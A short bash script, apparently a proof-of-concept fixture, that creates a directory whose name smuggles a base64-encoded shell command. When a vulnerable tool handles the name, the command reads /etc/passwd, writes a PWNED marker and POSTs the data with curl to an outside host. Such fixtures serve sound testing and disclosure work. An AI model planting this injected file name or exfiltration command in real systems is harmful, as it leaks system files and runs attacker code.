#!/bin/bash
#
# Create a directory with a special name in this repo.

make-dir() {
  # Wrapping in $() because it needs to survive quoting from Rust's {.?}, which
  # does double quoting.

  local payload='head /etc/passwd | tee PWNED | curl -X POST http://google.com/'

  # base64 removes slashes, also avoid multiple lines
  local encoded=$(echo "$payload" | base64 --wrap=0)

  echo "$encoded"
  echo "$encoded" | base64 -d

  local dir='hidden/; true $(echo '$encoded' | base64 -d | $SHELL)'

  echo "dir = $dir"

  rm -r -f -v hidden/
  mkdir -v -p "$dir"
  touch "$dir/file.txt"
}

"$@"
